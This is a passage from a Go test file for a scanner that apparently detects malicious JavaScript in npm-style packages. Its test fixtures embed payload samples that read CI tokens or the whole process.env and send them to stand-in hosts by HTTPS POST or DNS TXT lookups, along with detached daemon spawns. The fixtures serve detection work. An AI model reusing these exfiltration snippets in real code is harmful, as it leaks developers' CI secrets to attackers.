		t.Errorf("far-apart /proc/stat + cmdline must not chain, got: %+v", findings)
	}
}

// --- pass-2 fixes: inline require chain sinks + quoted stdio ---

func TestVuln_CISecretHarvest_InlineRequireHttpsRequest(t *testing.T) {
	// Compact payload form: require('https').request(...) without
	// binding the module first. Must still satisfy the network sink.
	body := `
const t = process.env.GITHUB_TOKEN;
require('https').request({hostname:'attacker.example', method:'POST'}).end(t);
`
	findings := analyze(t, "i.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("require('https').request inline form must trigger harvest, got: %+v", findings)
	}
}

func TestVuln_CISecretHarvest_InlineRequireHttpRequest(t *testing.T) {
	body := `
const t = process.env.NPM_TOKEN;
require("http").request("http://attacker/x", {method:"POST"}).end(t);
`
	findings := analyze(t, "i2.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("require(\"http\").request inline form must trigger harvest, got: %+v", findings)
	}
}

func TestVuln_CISecretHarvest_NodeSchemeRequire(t *testing.T) {
	body := `
const t = process.env.GITHUB_TOKEN;
require('node:https').request({hostname:'attacker.example'}).end(t);
`
	findings := analyze(t, "n.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("node: scheme require + token must trigger harvest, got: %+v", findings)
	}
}

func TestVuln_Daemon_QuotedStdioWithoutUnref(t *testing.T) {
	// JSON-quoted spawn options with quoted stdio but no .unref() must
	// still satisfy the daemon shape via stdio:'ignore'.
	body := `
const cp = require('child_process');
cp.spawn('node', ['./payload.js'], {"detached": true, "stdio": "ignore"});
`
	findings := analyze(t, "qs.js", body)
	if !hasRule(findings, RuleDaemon) {
		t.Errorf("quoted stdio:'ignore' must trigger daemon, got: %+v", findings)
	}
}

// --- pass-1 fixes: narrow network sinks, /proc memory, quoted detached ---

func TestSafe_LocalClientPostNotNetworkSink(t *testing.T) {
	// A local helper that happens to expose `.post(...)` (e.g. a
	// pub/sub bus, an ORM, a queue client) must not by itself satisfy
	// the network-sink half of the harvest chain.
	body := `
const queue = require('./local-queue');
const tok = process.env.GITHUB_TOKEN;
queue.post({ id: 1, payload: tok });
`
	findings := analyze(t, "x.js", body)
	if hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("local .post(...) must not satisfy network sink, got: %+v", findings)
	}
}

func TestSafe_ProcStatNotMemoryAccess(t *testing.T) {
	// A benign /proc/stat read paired with an OIDC env reference must
	// not trigger JS_PROC_MEM_OIDC_001: the rule targets
	// /proc/<pid>/(mem|maps|cmdline) specifically.
	body := `
const fs = require('fs');
const stat = fs.readFileSync('/proc/stat', 'utf8');
console.log(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN ? 'yes' : 'no');
`
	findings := analyze(t, "stat.js", body)
	if hasRule(findings, RuleProcMemOIDC) {
		t.Errorf("/proc/stat alone must not trigger ProcMemOIDC, got: %+v", findings)
	}
}

func TestVuln_Daemon_QuotedDetachedProperty(t *testing.T) {
	// JSON-style spawn options must still chain.
	body := `
const cp = require('child_process');
const child = cp.spawn('node', ['./payload.js'], {"detached": true, "stdio": "ignore"});
child.unref();
`
	findings := analyze(t, "q.js", body)
	if !hasRule(findings, RuleDaemon) {
		t.Errorf("quoted \"detached\": true must trigger daemon, got: %+v", findings)
	}
}

func TestVuln_ProcMemSelfMaps(t *testing.T) {
	// /proc/self/maps with Runner.Worker reference is the canonical
	// runner-pivot shape.
	body := `
const maps = require('fs').readFileSync('/proc/self/maps');
if (maps.includes('Runner.Worker')) { /* found runner */ }
`
	findings := analyze(t, "rm.js", body)
	if !hasRule(findings, RuleProcMemOIDC) {
		t.Errorf("/proc/self/maps + Runner.Worker must trigger, got: %+v", findings)
	}
}

// --- JS_DNS_TXT_EXFIL_001 ---

func TestVuln_DNSTXTExfil_NodeIPCChain(t *testing.T) {
	// The May 2026 node-ipc compromise shape: child_process.fork
	// daemonization, env-var stage to envs.txt, archive packed into
	// os.tmpdir, DNS TXT exfil via the bt.node.js zone. The DAEMON
	// rule fires on its own chain; DNS TXT exfil fires CRITICAL
	// thanks to the IOC needle and the multi-partner chain.
	body := `
const dns = require('dns');
const cp = require('child_process');
const fs = require('fs');
const os = require('os');
const t = process.env.GITHUB_TOKEN;
fs.writeFileSync(os.tmpdir() + '/envs.txt', JSON.stringify(process.env));
const archive = os.tmpdir() + '/nt-stage.tar.gz';
const ch = cp.fork('./payload.cjs', [], {detached: true, stdio: 'ignore'}); ch.unref();
dns.resolveTxt('xh.' + Date.now() + '.bt.node.js', (err, rec) => {});
`
	findings := analyze(t, "node-ipc.cjs", body)
	f := findRule(findings, RuleDNSTXTExfil)
	if f == nil {
		t.Fatalf("expected JS_DNS_TXT_EXFIL_001 to fire on full chain, got: %+v", findings)
	}
	if f.Severity != types.SeverityCritical {
		t.Errorf("expected CRITICAL on full IOC chain, got %v", f.Severity)
	}
	if !hasRule(findings, RuleDaemon) {
		t.Errorf("daemon chain (cp.fork + detached + stdio:ignore + unref) must also still fire")
	}
}

func TestVuln_DNSTXTExfil_ResolverInstance(t *testing.T) {
	// resolveTxt called on a new dns.Resolver() instance is the same
	// covert channel; the alias detector must bind the constructor's
	// local name.
	body := `
const dns = require('node:dns');
const r = new dns.Resolver();
const t = process.env.NPM_TOKEN;
require('fs').writeFileSync(require('os').tmpdir() + '/envs.txt', t);
const arch = require('os').tmpdir() + '/nt-bundle.tar.gz';
r.resolveTxt('probe.bt.node.js', (e, a) => {});
`
	findings := analyze(t, "payload.cjs", body)
	if !hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("Resolver-based resolveTxt with secret + envs.txt + archive must trigger, got: %+v", findings)
	}
}

func TestVuln_DNSTXTExfil_PromisesDestructure(t *testing.T) {
	// Destructured import of resolveTxt from dns/promises, aliased.
	body := `
import { resolveTxt as lookup } from 'dns/promises';
import fs from 'fs';
import os from 'os';
const secret = process.env.AWS_ACCESS_KEY_ID;
fs.writeFileSync(os.tmpdir() + '/envs.txt', secret);
await lookup('bt.node.js');
`
	findings := analyze(t, "exfil.mjs", body)
	f := findRule(findings, RuleDNSTXTExfil)
	if f == nil {
		t.Fatalf("destructured resolveTxt + secret + envs.txt + IOC must trigger, got: %+v", findings)
	}
	if f.Severity != types.SeverityCritical {
		t.Errorf("expected CRITICAL when node-ipc IOC needle is present, got %v", f.Severity)
	}
}

func TestSafe_DNSTXT_DMARCResolverOnly(t *testing.T) {
	// A legitimate DMARC checker uses resolveTxt without any secret
	// read, envs.txt staging, archive, daemon, or known IOC. Must
	// not fire.
	body := `
const dns = require('dns').promises;
async function checkDMARC(domain) {
  const records = await dns.resolveTxt('_dmarc.' + domain);
  return records.length > 0;
}
module.exports = { checkDMARC };
`
	findings := analyze(t, "dmarc.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("resolveTxt alone on a normal DMARC zone must not trigger, got: %+v", findings)
	}
}

func TestSafe_DNSTXT_ArchiveAloneNoSink(t *testing.T) {
	// tar.gz + os.tmpdir without any DNS TXT call (and no other chain
	// signals) must not fire the DNS rule.
	body := `
const tar = require('tar');
const os = require('os');
tar.c({file: os.tmpdir() + '/build-output.tar.gz'}, ['./dist']);
`
	findings := analyze(t, "build.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("archive without a resolveTxt sink must not trigger, got: %+v", findings)
	}
}

func TestVuln_DNSTXTExfil_SecretAndEnvsTxtAreSeparatePartners(t *testing.T) {
	// process.env read and envs.txt staging are two distinct exfil
	// behaviors. With archive proximity added, the chain reaches three
	// partners and must escalate to CRITICAL even without a known IOC
	// or a daemon chain.
	body := `
const dns = require('dns');
const fs = require('fs');
const os = require('os');
const t = process.env.GITHUB_TOKEN;
fs.writeFileSync(os.tmpdir() + '/envs.txt', t);
const archive = os.tmpdir() + '/stage.tar.gz';
dns.resolveTxt('exfil.example', () => {});
`
	findings := analyze(t, "harvest.js", body)
	f := findRule(findings, RuleDNSTXTExfil)
	if f == nil {
		t.Fatalf("expected JS_DNS_TXT_EXFIL_001 on secret + envs.txt + archive, got: %+v", findings)
	}
	if f.Severity != types.SeverityCritical {
		t.Errorf("expected CRITICAL (three partners: secret, envs.txt, archive), got %v", f.Severity)
	}
}

func TestVuln_DNSTXTExfil_PromisesOnModuleAlias(t *testing.T) {
	// `dns.promises.resolveTxt(...)` is the documented Node form when
	// the developer binds the callback module and reaches into the
	// promise sub-namespace. The receiver regex must catch it.
	body := `
const dns = require('dns');
const fs = require('fs');
const os = require('os');
const t = process.env.GITHUB_TOKEN;
fs.writeFileSync(os.tmpdir() + '/envs.txt', t);
const arch = os.tmpdir() + '/stage.tar.gz';
await dns.promises.resolveTxt('exfil.example');
`
	findings := analyze(t, "promises.cjs", body)
	if !hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("dns.promises.resolveTxt on a module alias must satisfy the sink, got: %+v", findings)
	}
}

func TestVuln_DNSTXTExfil_URLBeforeSinkOnSameLine(t *testing.T) {
	// Minified one-line payload: a `https://...` URL literal appears
	// before the resolveTxt call. A naive comment strip treats the
	// `//` in the URL as a line-comment opener and blanks the rest
	// of the line, hiding the sink. The string-aware walker keeps
	// the URL bytes intact so the resolveTxt call still registers.
	body := "const dns = require('dns'); const endpoint = 'https://sh.azurestaticprovider.net'; const t = process.env.GITHUB_TOKEN; require('fs').writeFileSync(require('os').tmpdir() + '/envs.txt', t); dns.resolveTxt('xh.bt.node.js', () => {});\n"
	findings := analyze(t, "oneline.cjs", body)
	if !hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("URL literal before resolveTxt on a minified line must NOT mask the sink, got: %+v", findings)
	}
}

func TestVuln_DNSTXTExfil_TemplateLiteralArchive(t *testing.T) {
	// Real payloads commonly build the archive path via a template
	// literal: `${os.tmpdir()}/stage.tar.gz`. The os.tmpdir() call
	// inside ${...} is executable code, not string content, and
	// must satisfy the archive partner.
	body := "\n" +
		"const dns = require('dns');\n" +
		"const os = require('os');\n" +
		"const archive = `${os.tmpdir()}/stage.tar.gz`;\n" +
		"dns.resolveTxt('xh.bt.node.js', () => {});\n"
	findings := analyze(t, "tpl-archive.cjs", body)
	if !hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("template-literal `${os.tmpdir()}/stage.tar.gz` must satisfy the archive partner, got: %+v", findings)
	}
}

func TestSafe_DNSTXT_UnrelatedTmpdirReceiverIsNotAnArchiveAnchor(t *testing.T) {
	// `config.tmpdir()` is NOT the Node os helper. The archive
	// anchor must not register it.
	body := `
const dns = require('dns');
const config = { tmpdir: () => '/tmp/cache' };
const archive = config.tmpdir() + '/stage.tar.gz';
dns.resolveTxt('example.com', () => {});
console.log(archive);
`
	findings := analyze(t, "config-tmp.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("config.tmpdir() must not satisfy the os archive anchor, got: %+v", findings)
	}
}

func TestVuln_DNSTXTExfil_CommaSeparatedResolver(t *testing.T) {
	// `const dns = require('dns'), r = new dns.Resolver(); r.resolveTxt(...)`
	// — comma-separated declaration of dns alias and Resolver
	// instance. Both must register.
	body := `
const dns = require('dns'), r = new dns.Resolver();
const t = process.env.GITHUB_TOKEN;
console.log(t);
r.resolveTxt('bt.node.js');
`
	if !hasRule(analyze(t, "comma-resolver.cjs", body), RuleDNSTXTExfil) {
		t.Errorf("comma-separated Resolver declaration must register the receiver")
	}
}

func TestSafe_DNSTXT_StringArgDaemonOptionsNotAPartner(t *testing.T) {
	// child_process.spawn() with a string argument that happens
	// to contain `{detached: true, stdio: 'ignore'}` as DATA
	// (e.g. a shell snippet) must NOT satisfy the daemon partner.
	// The options inside the spawn's first quoted arg are not
	// the call's own option object.
	body := `
const dns = require('dns');
const cp = require('child_process');
cp.spawn('echo {detached: true, stdio: \'ignore\'}', []);
dns.resolveTxt('example.com', () => {});
`
	findings := analyze(t, "string-arg-daemon.cjs", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("daemon options inside a STRING argument must not satisfy the daemon partner, got: %+v", findings)
	}
}

func TestVuln_DNSTXTExfil_CallFollowedByBlockOnNewLine(t *testing.T) {
	// A bare resolveTxt call followed by an unrelated block
	// statement on the next line must still satisfy the sink.
	// (Regression: previous isFunctionDefinition heuristic
	// confused this with a method body.)
	body := `
const dns = require('dns');
const { resolveTxt } = dns.promises;
const t = process.env.GITHUB_TOKEN;
console.log(t);
resolveTxt('bt.node.js')
{ const audit = 1; console.log(audit); }
`
	if !hasRule(analyze(t, "block-after.cjs", body), RuleDNSTXTExfil) {
		t.Errorf("bare resolveTxt followed by a block on a new line must register the call")
	}
}

func TestSafe_DNSTXT_RegexAfterControlFlowParenIsNotASink(t *testing.T) {
	// Regex literal as the body of `if (x) /pattern/.test(s)`.
	// The `)` is control-flow; `/` opens a regex, not division.
	// The regex contents must not be treated as executable code.
	body := `
const dns = require('dns');
const enabled = true;
const src = 'something';
const t = process.env.GITHUB_TOKEN;
console.log(t);
if (enabled) /dns\.resolveTxt\(.*\)/.test(src);
`
	findings := analyze(t, "ctrl-flow-regex.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("regex literal after control-flow `)` must not be executable code, got: %+v", findings)
	}
}

func TestVuln_DNSTXTExfil_WrappedProcessEnvSerialization(t *testing.T) {
	// JSON.stringify({ env: process.env }) and
	// JSON.stringify({ ...process.env }) both serialize the
	// entire process.env. Both must satisfy the secret partner.
	wrapped := `
const dns = require('dns');
const blob = JSON.stringify({ env: process.env });
dns.resolveTxt('q.' + blob.length + '.example');
`
	if !hasRule(analyze(t, "wrapped.cjs", wrapped), RuleDNSTXTExfil) {
		t.Errorf("JSON.stringify({env: process.env}) must satisfy the secret partner")
	}
	spread := `
const dns = require('dns');
const blob = JSON.stringify({ ...process.env });
dns.resolveTxt('q.' + blob.length + '.example');
`
	if !hasRule(analyze(t, "spread.cjs", spread), RuleDNSTXTExfil) {
		t.Errorf("JSON.stringify({...process.env}) must satisfy the secret partner")
	}
}

func TestVuln_DNSTXTExfil_ResolveTxtDestructuredFromAlias(t *testing.T) {
	// Two-step destructure: bind dns first, then destructure
	// resolveTxt from `dns.promises`. The bare call `resolveTxt(
	// ...)` must satisfy the sink.
	body := `
const dns = require('dns');
const { resolveTxt } = dns.promises;
const t = process.env.GITHUB_TOKEN;
console.log(t);
await resolveTxt('bt.node.js');
`
	if !hasRule(analyze(t, "two-step.cjs", body), RuleDNSTXTExfil) {
		t.Errorf("destructure of resolveTxt from a verified dns alias must satisfy the sink")
	}
}

func TestVuln_DNSTXTExfil_DestructureWithDefault(t *testing.T) {
	// `const { GITHUB_TOKEN = '' } = process.env` is a valid
	// destructure with a default initializer. The source member
	// name must be extracted by stripping the `= ...` initializer.
	body := `
const dns = require('dns');
const { GITHUB_TOKEN = '' } = process.env;
console.log(GITHUB_TOKEN);
dns.resolveTxt('bt.node.js', () => {});
`
	if !hasRule(analyze(t, "default-destruct.cjs", body), RuleDNSTXTExfil) {
		t.Errorf("destructure with default initializer must satisfy the secret partner")
	}
}

func TestSafe_DNSTXT_NestedTmpdirOuterCommaSeparates(t *testing.T) {
	// `const tmp = path.join(os.tmpdir()), help = 'stage.tar.gz';`
	// — tmpdir is inside path.join, but after path.join's `)` the
	// next `,` is at the OUTER (top) level and is a sequence
	// separator. The archive token after it must not satisfy the
	// partner.
	body := `
const dns = require('dns');
const os = require('os');
const path = require('path');
const tmp = path.join(os.tmpdir()), help = 'stage.tar.gz';
console.log(tmp, help);
dns.resolveTxt('example.com', () => {});
`
	findings := analyze(t, "nested-tmp-comma.cjs", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("outer-comma after nested tmpdir must separate the archive partner, got: %+v", findings)
	}
}

func TestSafe_DNSTXT_NamedEnvAssignmentIsNotARead(t *testing.T) {
	// `process.env.GITHUB_TOKEN = 'fake'` is an assignment, not a
	// read. Setup/test code that initializes named env vars
	// must not satisfy the secret partner.
	body := `
const dns = require('dns');
process.env.GITHUB_TOKEN = 'fake-for-test';
process.env['NPM_TOKEN'] = 'test';
dns.resolveTxt('example.com', () => {});
`
	findings := analyze(t, "env-assign.cjs", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("named env assignment must not satisfy the secret partner, got: %+v", findings)
	}
}

func TestSafe_DNSTXT_DynamicProcessEnvWriteIsNotARead(t *testing.T) {
	// `process.env[k] = 'x'` is a WRITE on the LHS of an
	// assignment. Must not satisfy the secret partner.
	body := `
const dns = require('dns');
const keys = ['LOG_LEVEL', 'CI'];
for (const k of keys) process.env[k] = 'default';
dns.resolveTxt('example.com', () => {});
`
	findings := analyze(t, "env-write.cjs", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("process.env[k] = ... write must not satisfy the secret partner, got: %+v", findings)
	}
}

func TestVuln_DNSTXTExfil_CommaSeparatedCJSDeclarators(t *testing.T) {
	// Minified install scripts often declare multiple requires
	// with a single keyword: `const fs = require('fs'), os = ...,
	// dns = require('dns')`. The second and third bindings have
	// no `const` prefix and must still register.
	body := `
const fs = require('fs'), os = require('os'), dns = require('dns');
const t = process.env.GITHUB_TOKEN;
fs.writeFileSync(os.tmpdir() + '/envs.txt', t);
dns.resolveTxt('bt.node.js', () => {});
`
	if !hasRule(analyze(t, "comma-decl.cjs", body), RuleDNSTXTExfil) {
		t.Errorf("comma-separated CJS declarators must register dns/fs/os aliases")
	}
}

func TestSafe_DNSTXT_ObjectAssignProcessEnvTargetIsNotARead(t *testing.T) {
	// Object.assign(process.env, defaults) MUTATES process.env;
	// it does not read its values. Must not satisfy the secret
	// partner.
	body := `
const dns = require('dns');
Object.assign(process.env, { LOG_LEVEL: 'debug' });
dns.resolveTxt('example.com', () => {});
`
	findings := analyze(t, "assign-target.cjs", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("Object.assign(process.env, ...) target-position write must not satisfy the secret partner, got: %+v", findings)
	}
}

func TestVuln_DNSTXTExfil_ObjectAssignProcessEnvAsSource(t *testing.T) {
	// Object.assign({}, process.env) READS process.env values.
	// Must satisfy the secret partner.
	body := `
const dns = require('dns');
const cloned = Object.assign({}, process.env);
console.log(cloned);
dns.resolveTxt('bt.node.js', () => {});
`
	if !hasRule(analyze(t, "assign-source.cjs", body), RuleDNSTXTExfil) {
		t.Errorf("Object.assign({}, process.env) source-position read must satisfy the secret partner")
	}
}

func TestSafe_DNSTXT_EnvsTxtAsDataNotPath(t *testing.T) {
	// fs.writeFileSync('/tmp/readme.txt', 'envs.txt') — envs.txt
	// is the DATA being written, not the filename. Must not
	// register as a staging partner.
	body := `
const dns = require('dns');
const fs = require('fs');
fs.writeFileSync('/tmp/readme.txt', 'envs.txt');
dns.resolveTxt('example.com', () => {});
`
	findings := analyze(t, "envs-as-data.cjs", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("envs.txt as DATA (not path) must not satisfy the staging partner, got: %+v", findings)
	}
}

func TestVuln_DNSTXTExfil_InlineRequireBracketAccess(t *testing.T) {
	// require('dns')['resolveTxt'](...) — no local alias, bracket
	// access on the inline require chain.
	body := `
const t = process.env.GITHUB_TOKEN;
console.log(t);
require('dns')['resolveTxt']('bt.node.js');
`
	if !hasRule(analyze(t, "inline-bracket.cjs", body), RuleDNSTXTExfil) {
		t.Errorf("inline require('dns')['resolveTxt']() must satisfy the sink")
	}
}

func TestSafe_DNSTXT_SequenceExpressionSeparatesPartners(t *testing.T) {
	// Top-level sequence expression: writeFileSync writes to an
	// unrelated path, then a separate assignment puts envs.txt in
	// a variable. The `,` at top level is a sequence separator;
	// envs.txt must not be the staging partner for the write call.
	body := `
const dns = require('dns');
const fs = require('fs');
let help;
fs.writeFileSync('/tmp/log','x'), help='/envs.txt';
dns.resolveTxt('example.com', () => {});
console.log(help);
`
	findings := analyze(t, "seq-expr.cjs", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("top-level sequence expression must separate write and envs.txt token, got: %+v", findings)
	}
}

func TestSafe_DNSTXT_ObjectKeysProcessEnvAloneNotASecretRead(t *testing.T) {
	// `Object.keys(process.env)` only enumerates variable names,
	// not values. Without an actual value read, the secret
	// partner must not register.
	body := `
const dns = require('dns');
const names = Object.keys(process.env);
console.log(names.length);
dns.resolveTxt('example.com', () => {});
`
	if hasRule(analyze(t, "keys-only.cjs", body), RuleDNSTXTExfil) {
		t.Errorf("Object.keys(process.env) without a value read must not satisfy the secret partner")
	}
}

func TestVuln_DNSTXTExfil_DynamicBracketEnvAccess(t *testing.T) {
	// The two-step pattern: enumerate keys, then dynamically read
	// values via process.env[k]. The bracket access is the value
	// read and must satisfy the partner.
	body := `
const dns = require('dns');
Object.keys(process.env).forEach(k => dns.resolveTxt(process.env[k] + '.example'));
`
	if !hasRule(analyze(t, "dynamic-bracket.cjs", body), RuleDNSTXTExfil) {
		t.Errorf("process.env[k] dynamic access must satisfy the secret partner")
	}
}

func TestVuln_DNSTXTExfil_WholeProcessEnvForEach(t *testing.T) {
	// Object.values(process.env).forEach(... dns.resolveTxt(...)).
	// Most direct DNS credential-exfil shape; no specific CI
	// variable is named, but the whole-env enumeration is itself
	// the secret partner.
	body := `
const dns = require('dns');
Object.values(process.env).forEach(v => dns.resolveTxt('q.' + v + '.example'));
`
	if !hasRule(analyze(t, "whole-env-foreach.cjs", body), RuleDNSTXTExfil) {
		t.Errorf("whole-process env enumeration must satisfy the secret partner")
	}
}

func TestVuln_DNSTXTExfil_JSONStringifyProcessEnv(t *testing.T) {
	body := `
const dns = require('dns');
const blob = JSON.stringify(process.env);
dns.resolveTxt('x.' + Buffer.from(blob).toString('hex') + '.example');
`
	if !hasRule(analyze(t, "json-env.cjs", body), RuleDNSTXTExfil) {
		t.Errorf("JSON.stringify(process.env) must satisfy the secret partner")
	}
}

func TestVuln_DNSTXTExfil_FsPromisesDestructuredAsAlias(t *testing.T) {
	// `const { promises: fs } = require('fs')` binds the fs.promises
	// namespace under the local name `fs`. Later `fs.writeFile(...)`
	// is the standard promises API and must satisfy the staging
	// partner.
	cjs := `
const dns = require('dns');
const { promises: fs } = require('fs');
const os = require('os');
await fs.writeFile(os.tmpdir() + '/envs.txt', JSON.stringify(process.env));
await dns.promises.resolveTxt('bt.node.js');
`
	if !hasRule(analyze(t, "promises-as-fs.cjs", cjs), RuleDNSTXTExfil) {
		t.Errorf("CJS `{ promises: fs }` destructure must register `fs` as a write receiver")
	}
	esm := `
import dns from 'dns';
import { promises as fs } from 'fs';
import os from 'os';
await fs.writeFile(os.tmpdir() + '/envs.txt', JSON.stringify(process.env));
await dns.promises.resolveTxt('bt.node.js');
`
	if !hasRule(analyze(t, "promises-as-fs.mjs", esm), RuleDNSTXTExfil) {
		t.Errorf("ESM `{ promises as fs }` must register `fs` as a write receiver")
	}
}

func TestVuln_DNSTXTExfil_OptionalChainAndBracketAccess(t *testing.T) {
	// dns.resolveTxt?.(...), dns?.resolveTxt(...), and
	// dns['resolveTxt'](...) are all valid modern JS sink forms.
	optChain := `
const dns = require('dns');
const t = process.env.GITHUB_TOKEN;
console.log(t);
dns.resolveTxt?.('bt.node.js');
`
	if !hasRule(analyze(t, "opt-chain.cjs", optChain), RuleDNSTXTExfil) {
		t.Errorf("dns.resolveTxt?.(...) must satisfy the sink")
	}
	optChainReceiver := `
const dns = require('dns');
const t = process.env.GITHUB_TOKEN;
console.log(t);
dns?.resolveTxt('bt.node.js');
`
	if !hasRule(analyze(t, "opt-recv.cjs", optChainReceiver), RuleDNSTXTExfil) {
		t.Errorf("dns?.resolveTxt(...) must satisfy the sink")
	}
	bracket := `
const dns = require('dns');
const t = process.env.GITHUB_TOKEN;
console.log(t);
dns['resolveTxt']('bt.node.js');
`
	if !hasRule(analyze(t, "bracket.cjs", bracket), RuleDNSTXTExfil) {
		t.Errorf("dns['resolveTxt'](...) must satisfy the sink")
	}
	optBracket := `
const dns = require('dns');
const t = process.env.GITHUB_TOKEN;
console.log(t);
dns?.['resolveTxt']('bt.node.js');
`
	if !hasRule(analyze(t, "opt-bracket.cjs", optBracket), RuleDNSTXTExfil) {
		t.Errorf("dns?.['resolveTxt'](...) must satisfy the sink")
	}
}

func TestSafe_DNSTXT_PatternsInRegexLiteralNotASink(t *testing.T) {
	// A test/detection file embeds a regex literal whose pattern
	// names dns.resolveTxt. The regex literal is NOT executable
	// code; with any real partner signal, the rule must not fire.
	body := `
const dns = require('dns');
const detector = /dns\.resolveTxt\s*\(/;
const t = process.env.GITHUB_TOKEN;
console.log(detector, t);
`
	findings := analyze(t, "regex-literal.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("regex-literal patterns must not satisfy the DNS sink, got: %+v", findings)
	}
}

func TestVuln_DNSTXTExfil_PromisesResolverInstance(t *testing.T) {
	// `const r = new dns.promises.Resolver(); r.resolveTxt(...)`
	// is the documented promises sub-namespace Resolver shape.
	body := `
const dns = require('dns');
const r = new dns.promises.Resolver();
const t = process.env.GITHUB_TOKEN;
console.log(t);
await r.resolveTxt('bt.node.js');
`
	if !hasRule(analyze(t, "promises-instance.cjs", body), RuleDNSTXTExfil) {
		t.Errorf("new dns.promises.Resolver() instance must satisfy the sink")
	}
}

func TestSafe_DNSTXT_InlineRequireInsideHelpString(t *testing.T) {
	// Doc string contains an inline-require example. With a real
	// secret partner present, the rule must NOT fire because the
	// require text is inside a string literal.
	body := `
const dns = require('dns');
const HELP = "require('dns').resolveTxt('example.com', cb)";
const t = process.env.GITHUB_TOKEN;
console.log(HELP, t);
`
	findings := analyze(t, "inline-doc.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("inline-require example inside a help string must not satisfy the sink, got: %+v", findings)
	}
}

func TestSafe_DNSTXT_InlineFsRequireInsideHelpString(t *testing.T) {
	body := `
const dns = require('dns');
const HELP = "require('fs').writeFileSync('/envs.txt', x);";
async function lookup(d) { return await dns.promises.resolveTxt(d); }
module.exports = { HELP, lookup };
`
	findings := analyze(t, "inline-fs-doc.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("inline fs.require example inside a string must not satisfy the staging partner, got: %+v", findings)
	}
}

func TestVuln_DNSTXTExfil_ResolverFromDnsPromises(t *testing.T) {
	// `import { Resolver } from 'node:dns/promises'` is a real
	// destructure. The new resolver constructor and resolveTxt
	// call must register.
	body := `
import { Resolver } from 'node:dns/promises';
const r = new Resolver();
const t = process.env.GITHUB_TOKEN;
console.log(t);
await r.resolveTxt('bt.node.js');
`
	if !hasRule(analyze(t, "promises-resolver.mjs", body), RuleDNSTXTExfil) {
		t.Errorf("Resolver destructured from dns/promises must satisfy the sink")
	}
}

func TestSafe_DNSTXT_MyRequireNotAnInlineSink(t *testing.T) {
	// A helper named `myrequire` ends in the substring `require`.
	// The inline-require regex must be anchored so the suffix
	// match does not register as a Node DNS sink.
	body := `
function myrequire(name) { return { resolveTxt: () => null }; }
const handle = myrequire('dns').resolveTxt('zone');
const t = process.env.GITHUB_TOKEN;
console.log(handle, t);
`
	findings := analyze(t, "myrequire.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("myrequire(...) must not match the Node require boundary, got: %+v", findings)
	}
}

func TestSafe_DNSTXT_StringInsideTemplateInterpolationNotASink(t *testing.T) {
	// A template literal's `${...}` interpolation contains a
	// nested string that quotes a fake resolveTxt example. With
	// real partner signals present, the sink must NOT register.
	body := "\n" +
		"const dns = require('dns');\n" +
		"const t = process.env.GITHUB_TOKEN;\n" +
		"require('fs').writeFileSync(require('os').tmpdir() + '/envs.txt', t);\n" +
		"const tmpl = `prefix ${\"dns.resolveTxt('xh.bt.node.js')\"} suffix`;\n" +
		"console.log(tmpl);\n"
	findings := analyze(t, "tmpl-nested.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("nested string inside ${...} must not be code-context for sink, got: %+v", findings)
	}
}

func TestVuln_DNSTXTExfil_NewlineLeadingOperatorContinuation(t *testing.T) {
	// `os.tmpdir()` on one line, `+ '/stage.tar.gz'` on the next.
	// JS continues this as a single statement, so the archive
	// partner must register.
	body := `
const dns = require('dns');
const os = require('os');
const archive = os.tmpdir()
  + '/stage.tar.gz';
dns.resolveTxt('xh.bt.node.js', () => {});
console.log(archive);
`
	if !hasRule(analyze(t, "leading-op.cjs", body), RuleDNSTXTExfil) {
		t.Errorf("newline followed by leading `+` operator must keep the same statement")
	}
}

func TestSafe_DNSTXT_NestedPropertyChainNotAReceiver(t *testing.T) {
	// `wrapper.os.tmpdir()` matches `os.tmpdir` as a suffix. The
	// jsIdentBoundary on the receiver regex must prevent counting
	// this as a real os.tmpdir call.
	body := `
const dns = require('dns');
const wrapper = { os: { tmpdir: () => '/mock' } };
const archive = wrapper.os.tmpdir() + '/stage.tar.gz';
console.log(archive);
dns.resolveTxt('example.com', () => {});
`
	findings := analyze(t, "nested.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("nested property chain wrapper.os.tmpdir must not satisfy the receiver match, got: %+v", findings)
	}
}

func TestVuln_DNSTXTExfil_RenamedTmpdirDestructure(t *testing.T) {
	// `const { tmpdir: t } = require('os'); t() + '/...'`. The
	// local name is `t`, but its source is `tmpdir`, so the
	// archive anchor must accept the call.
	body := `
const dns = require('dns');
const { tmpdir: t } = require('os');
const archive = t() + '/stage.tar.gz';
dns.resolveTxt('xh.bt.node.js', () => {});
console.log(archive);
`
	if !hasRule(analyze(t, "renamed-tmp.cjs", body), RuleDNSTXTExfil) {
		t.Errorf("renamed os.tmpdir destructure must satisfy the archive anchor")
	}
}

func TestVuln_DNSTXTExfil_RenamedFsWriteDestructure(t *testing.T) {
	// `const { writeFileSync: w } = require('fs'); w('/envs.txt',
	// ...)`. The local `w` source is writeFileSync; the staging
	// partner must accept.
	body := `
const dns = require('dns');
const { writeFileSync: w } = require('fs');
